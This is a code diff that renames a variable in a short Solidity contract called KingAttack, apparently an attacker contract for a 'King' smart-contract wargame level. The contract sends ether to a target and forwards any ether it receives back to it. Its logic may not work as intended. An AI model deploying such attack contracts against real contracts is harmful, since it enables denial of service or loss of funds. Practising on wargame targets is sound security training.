@@ -2,17 +2,17 @@
 pragma solidity ^0.8.0;
 
 contract KingAttack {
-    address payable target;
+    address payable targetAddress;
 
-    constructor(address payable _target) payable {
-        target = _target;
+    constructor(address payable _targetAddress) payable {
+        targetAddress = _targetAddress;
     }
 
     function attack() external payable {
-        target.call{value: msg.value}("");
+        targetAddress.call{value: msg.value}("");
     }
 
     receive() external payable {
-        target.call{value: msg.value}("");
+        targetAddress.call{value: msg.value}("");
     }
 }
